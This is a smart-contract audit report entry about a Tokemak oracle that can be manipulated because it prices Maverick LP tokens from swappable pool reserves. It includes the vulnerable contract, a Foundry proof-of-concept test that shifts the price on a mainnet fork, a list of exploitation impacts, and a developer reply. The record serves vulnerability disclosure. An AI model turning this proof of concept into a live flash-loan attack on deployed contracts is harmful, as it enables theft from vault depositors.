{
  "Title": "H-15: Maverick oracle can be manipulated",
  "Content": "# Issue H-15: Maverick oracle can be manipulated \n\nSource: https://github.com/sherlock-audit/2023-06-tokemak-judging/issues/635 \n\n## Found by \nBauchibred, ctf\\_sec, duc, lemonmon, rvierdiiev, saidam017, xiaoming90\nThe MavEthOracle.getPriceInEth() function uses the reserves of the Maverick pool to calculate the price of Maverick LP tokens. These reserves can be manipulated, which can lead to incorrect results of Maverick oracle.\n## Vulnerability Detail\nIn the MavEthOracle contract, `getPriceInEth` function utilizes the reserves of the Maverick pool and multiplies them with the external prices of the tokens (obtained from the rootPriceOracle contract) to calculate the total value of the Maverick position.\n```solidity=\n// Get reserves in boosted position.\n(uint256 reserveTokenA, uint256 reserveTokenB) = boostedPosition.getReserves();\n\n// Get total supply of lp tokens from boosted position.\nuint256 boostedPositionTotalSupply = boostedPosition.totalSupply();\n\nIRootPriceOracle rootPriceOracle = systemRegistry.rootPriceOracle();\n\n// Price pool tokens.\nuint256 priceInEthTokenA = rootPriceOracle.getPriceInEth(address(pool.tokenA()));\nuint256 priceInEthTokenB = rootPriceOracle.getPriceInEth(address(pool.tokenB()));\n\n// Calculate total value of each token in boosted position.\nuint256 totalBoostedPositionValueTokenA = reserveTokenA * priceInEthTokenA;\nuint256 totalBoostedPositionValueTokenB = reserveTokenB * priceInEthTokenB;\n\n// Return price of lp token in boosted position.\nreturn (totalBoostedPositionValueTokenA + totalBoostedPositionValueTokenB) / boostedPositionTotalSupply;\n```\nHowever, the reserves of a Maverick position can fluctuate when the price of the Maverick pool changes. Therefore, the returned price of this function can be manipulated by swapping a significant amount of tokens into the Maverick pool. An attacker can utilize a flash loan to initiate a swap, thereby changing the price either upwards or downwards, and subsequently swapping back to repay the flash loan.\n\nAttacker can decrease the returned price of MavEthOracle by swapping a large amount of the higher value token for the lower value token, and vice versa.\n\nHere is a test file that demonstrates how the price of the MavEthOracle contract can be manipulated by swapping to change the reserves.\n\n```solidity=\npragma solidity 0.8.17;\n\nimport { Test } from \"forge-std/Test.sol\";\nimport 'forge-std/console.sol';\n\nimport { WETH9_ADDRESS, TOKE_MAINNET, WSTETH_MAINNET } from \"test/utils/Addresses.sol\";\n\nimport { IPool } from \"src/interfaces/external/maverick/IPool.sol\";\nimport { MavEthOracle } from \"src/oracles/providers/MavEthOracle.sol\";\nimport { SystemRegistry, ISystemRegistry } from \"src/SystemRegistry.sol\";\nimport { RootPriceOracle } from \"src/oracles/RootPriceOracle.sol\";\nimport { AccessController, IAccessController } from \"src/security/AccessController.sol\";\nimport { IPriceOracle } from \"src/interfaces/oracles/IPriceOracle.sol\";\nimport { SwEthEthOracle} from \"src/oracles/providers/SwEthEthOracle.sol\";\nimport { EthPeggedOracle} from \"src/oracles/providers/EthPeggedOracle.sol\";\nimport { IswETH } from \"src/interfaces/external/swell/IswETH.sol\";\nimport { IPoolPositionDynamicSlim } from \"src/interfaces/external/maverick/IPoolPositionDynamicSlim.sol\";\nimport { IERC20 } from \"openzeppelin-contracts/token/ERC20/IERC20.sol\";\n\ncontract NewTest is Test {\n  SystemRegistry public registry;\n  AccessController public accessControl;\n  RootPriceOracle public rootOracle;\n  MavEthOracle public mavOracle;\n\n  function setUp() external {\n    vm.createSelectFork(\"https://rpc.ankr.com/eth\", 17224221);\n    registry = new SystemRegistry(TOKE_MAINNET, WETH9_ADDRESS);\n    accessControl = new AccessController(address(registry));\n    registry.setAccessController(address(accessControl));\n    rootOracle = new RootPriceOracle(registry);\n    registry.setRootPriceOracle(address(rootOracle));\n    mavOracle = new MavEthOracle(registry);\n  }\n\n  function swapCallback(\n    uint256 amountToPay,\n    uint256 amountOut,\n    bytes calldata _data\n  ) external {\n    address tokenIn = abi.decode(_data, (address));\n    IERC20(tokenIn).transfer(msg.sender, amountToPay);\n  }\n\n  function test_MaverickOracleManipulation() external {\n    IswETH swETH = IswETH(0xf951E335afb289353dc249e82926178EaC7DEd78);\n    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    address boostedPosition = 0xF917FE742C530Bd66BcEbf64B42c777B13aac92c;\n    SwEthEthOracle swEthOracle = new SwEthEthOracle(registry, swETH);\n    EthPeggedOracle ethOracle = new EthPeggedOracle(registry);\n    rootOracle.registerMapping(address(swETH), swEthOracle);\n    rootOracle.registerMapping(weth, ethOracle);\n\n    (uint256 reserveA, uint256 reserveB) = IPoolPositionDynamicSlim(boostedPosition).getReserves();\n    console.log(\"reserves\", reserveA, reserveB);\n    uint256 mavPriceBefore = mavOracle.getPriceInEth(boostedPosition);\n    console.log(\"mavOracle price before\", mavPriceBefore);\n\n    //swap\n    deal(address(swETH), address(this), 1e24);\n    address pool = IPoolPositionDynamicSlim(boostedPosition).pool();\n    IPool(pool).swap(\n        address(this),\n        1e18,\n        false,\n        false,\n        0,\n        abi.encode(address(swETH))\n    );\n\n    (reserveA, reserveB) = IPoolPositionDynamicSlim(boostedPosition).getReserves();\n    console.log(\"reserves\", reserveA, reserveB);\n    uint256 mavPriceAfter = mavOracle.getPriceInEth(boostedPosition);\n    console.log(\"mavOracle price after\", mavPriceAfter);\n    \n    require(mavPriceBefore != mavPriceAfter);\n  }\n}\n```\n\n## Impact\nThere are multiple impacts that an attacker can exploit by manipulating the price of MavEthOracle:\n\n* Decreasing the oracle price to lower the totalDebt of LMPVault, in order to receive more LMPVault shares.\n* Increasing the oracle price to raise the totalDebt of LMPVault, in order to receive more withdrawn tokens.\n* Manipulating the results of the Stats contracts to cause miscalculations for the protocol.\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/src/oracles/providers/MavEthOracle.sol#L59-L72\n\n## Tool used\nManual Review\nFoundry\n\n## Recommendation\nUse another calculation for Maverick oracle\n\n\n\n## Discussion\n\n**codenutt**\n\nThe Mav oracle is only meant to price the value of a boosted position. This is further limited by us only supporting mode \"both\" positions: https://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/src/vault/README.md?plain=1#L14. The key about mode \"both\" positions is that they can only contain 1 bin. The maxTotalBinWidth check against the tick spacing, when limited to a single bin, controls the amount of price change we are willing to tolerate. Its default is 50 bps which we are willing to tolerate. \n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/101",
  "Code": [
    {
      "filename": "v2-core-audit-2023-07-14/src/oracles/providers/MavEthOracle.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\n// Copyright (c) 2023 Tokemak Foundation. All rights reserved.\n\npragma solidity 0.8.17;\n\nimport { IPool } from \"src/interfaces/external/maverick/IPool.sol\";\nimport { IPoolPositionDynamicSlim } from \"src/interfaces/external/maverick/IPoolPositionDynamicSlim.sol\";\nimport { Errors } from \"src/utils/Errors.sol\";\nimport { IPriceOracle } from \"src/interfaces/oracles/IPriceOracle.sol\";\nimport { IRootPriceOracle } from \"src/interfaces/oracles/IRootPriceOracle.sol\";\nimport { ISystemRegistry } from \"src/interfaces/ISystemRegistry.sol\";\nimport { SecurityBase } from \"src/security/SecurityBase.sol\";\nimport { SystemComponent } from \"src/SystemComponent.sol\";\n\ncontract MavEthOracle is SystemComponent, IPriceOracle, SecurityBase {\n    /// @notice Emitted when new maximum bin width is set.\n    event MaxTotalBinWidthSet(uint256 newMaxBinWidth);\n\n    /// @notice Thrown when the total width of all bins being priced exceeds the max.\n    error TotalBinWidthExceedsMax();\n\n    // 100 = 1% spacing, 10 = .1% spacing, 1 = .01% spacing etc.\n    uint256 public maxTotalBinWidth = 50;\n\n    constructor(ISystemRegistry _systemRegistry)\n        SystemComponent(_systemRegistry)\n        SecurityBase(address(_systemRegistry.accessController()))\n    {\n        Errors.verifyNotZero(address(_systemRegistry.rootPriceOracle()), \"priceOracle\");\n    }\n\n    /**\n     * @notice Gives ability to set total bin width to system owner.\n     * @param _maxTotalBinWidth New max bin width.\n     */\n    function setMaxTotalBinWidth(uint256 _maxTotalBinWidth) external onlyOwner {\n        Errors.verifyNotZero(_maxTotalBinWidth, \"_maxTotalbinWidth\");\n        maxTotalBinWidth = _maxTotalBinWidth;\n\n        emit MaxTotalBinWidthSet(_maxTotalBinWidth);\n    }\n\n    /// @inheritdoc IPriceOracle\n    function getPriceInEth(address _boostedPosition) external returns (uint256) {\n        // slither-disable-start similar-names\n        Errors.verifyNotZero(_boostedPosition, \"_boostedPosition\");\n\n        IPoolPositionDynamicSlim boostedPosition = IPoolPositionDynamicSlim(_boostedPosition);\n        IPool pool = IPool(boostedPosition.pool());\n\n        Errors.verifyNotZero(address(pool), \"pool\");\n\n        // Check that total width of all bins in position does not exceed what we deem safe.\n        if (pool.tickSpacing() * boostedPosition.allBinIds().length > maxTotalBinWidth) {\n            revert TotalBinWidthExceedsMax();\n        }\n\n        // Get reserves in boosted position.\n        (uint256 reserveTokenA, uint256 reserveTokenB) = boostedPosition.getReserves();\n\n        // Get total supply of lp tokens from boosted position.\n        uint256 boostedPositionTotalSupply = boostedPosition.totalSupply();\n\n        IRootPriceOracle rootPriceOracle = systemRegistry.rootPriceOracle();\n\n        // Price pool tokens.\n        uint256 priceInEthTokenA = rootPriceOracle.getPriceInEth(address(pool.tokenA()));\n        uint256 priceInEthTokenB = rootPriceOracle.getPriceInEth(address(pool.tokenB()));\n\n        // Calculate total value of each token in boosted position.\n        uint256 totalBoostedPositionValueTokenA = reserveTokenA * priceInEthTokenA;\n        uint256 totalBoostedPositionValueTokenB = reserveTokenB * priceInEthTokenB;\n\n        // Return price of lp token in boosted position.\n        return (totalBoostedPositionValueTokenA + totalBoostedPositionValueTokenB) / boostedPositionTotalSupply;\n        // slither-disable-end similar-names\n    }\n}"
    },
    {
      "filename": "v2-core-audit-2023-07-14/src/vault/README.md?plain=1",
      "content": "# Tokemak Vaults Docs\n\n## Autopilot (LMP) Vaults\n\nAutopilot Vaults will be the main jumping off point for end-user interactions with the system (though technically this is the Router, these are the tokens the user will get back). Users will deposit and withdraw the base asset from here. Vaults are ERC 4626 + Permit compatible.\n\nAn Autopilot Vault is actually a pair of contracts. These contracts are:\n\n-   The Vault itself\n-   A Convex-like, block height+rate style, Rewarder\n\nThe purpose of an Autopilot Vault is to represent a set of destinations that deposited assets may be deployed. It acts almost as an index. If an Autopilot Vault points to 5 destinations then your assets may be deployed to one or all of those destinations depending on how much those destinations are currently earning.\n\nIn this context, a “destination” is any DEX pool we are configured for: Balancer MetaStable/ComposableStable pools, Curve, and Maverick (mode both only). A “Destination Vault” is a vault contract that sits in front of each of those pools and represents it in our system.\n\n## Base Asset\n\nAn Autopilot Vault should track it’s “base asset”. This is the asset that will be deposited and withdrawn from the Vault. Any auto-compounding that happens will be in terms of the base asset, as well. The result of this is that an Autopilot Vault should only accept Destination Vaults in its Strategy that match it’s base asset. However, it is expected that the Autopilot Vaults associated Rewarder can emit any token(s).\n\n## Tracked Tokens\n\nVaults should treat tokens that they “track” different than other tokens. “Tracked” tokens are those that make up it’s core functionality. For an Autopilot Vault, that would be WETH and any Destination Vault LP tokens it holds. Tokens that are included in the Rewarder should never be stored directly in the Vault contract so it is safe to consider them “non-tracked”.\n\n## Autopilot Rewards (the Rewarder)\n\nAutopilot Vaults generate yield in multiple ways. One of the ways they do this is through auto-compounding. Auto-compounding happens at the Rebalancer + Destination Vault levels and isn’t much of a concern Autopilot the Autopilot Vault itself. However, each Autopilot Vault is itself a participant in a Convex-style Rewarder. This rewarder that emits some amount of TOKE or other tokens. The Rewarder itself doesn’t take a deposit of the Autopilot Vault LP token, but it is up to the Autopilot Vault to update the users balance in the rewarder before any minting/burning/transferring of the Autopilot LP units occurs.\n\nA Rewarder will exist per Autopilot Vault contract.\n\n## Profit Loss & Reporting\n\nPeriodically, an automated process will trigger a reporting event for the destinations related to an Autopilot Vault. An Autopilot Vault will compare it’s last known debt that is attributed to a Destination to that Destinations current reporting of its assets and determine if we are sitting with a profit or a loss. If we are in a loss scenario, we decrease our debt value immediately. If we are sitting at a profit, we take a fee, and recalculate the value.\n\n## Performance Fee\n\nAny time a profit is reported, the protocol is minted shares of the Autopilot Vault to represent the fee they are taking. Autopilot Vaults can have unique fee %’s.\n\n## Destination Vaults\n\nDestination Vaults are vaults that sit in front of any place we may be deploying assets. These vaults act as a common interface to these various places allowing us to hide the intricacies of DeFi from the rest of the system. These vaults also hold any receipt tokens we receive from these deployments. These are not 4626 vaults.\n\nTo facilitate the testing of these vaults, each type of destination has an explicitly defined contract in our code base. These are top-level contracts with minimal code, with the majority of the functionality being accessed from the Destination Vault contracts and Adapter libraries.\n\nDestination Vaults mint shares on 1:1 proportion against their underlyer and they're priced in terms of Vault's \"base asset\".\n\nEvery new Vault should be based on `src/vault/DestinationVault.sol` which encapsulates all the common functionality and gives the ability to child contracts to define the details of integrating with the specific exchanges. Destination Vaults usually combine two sources of operating destinations: the base layer of depositing (usually a pool) and LP staking part. E.g. in `CurveConvexDestinationVault` we operate with assets deployed to Curve and manage the rewards from staking Curve LPs to Convex.\n\n### Tracked Tokens\n\nVaults treat tokens that they “track” different than other tokens. “Tracked” tokens are those that make up it’s core functionality. For example, if a Destination Vault is targeting a stETH/rETH DEX pool, then the LP token of that pool, stETH, and rETH would all be considered “tracked” tokens. Additionally, the “base asset” for the vault, in our MVP case WETH, falls into this category.\n\n### Data\n\n-   `idle` - This is the amount of the base asset that is currently in the vault\n-   `debt` - This is the amount of the base asset that has been transferred away from Vault in service of a deployment.\n    -   For example, if the Vault contained 100 idle WETH and we decided to deploy the entire lot, idle would go to 0, and debt would go to 100"
    }
  ]
}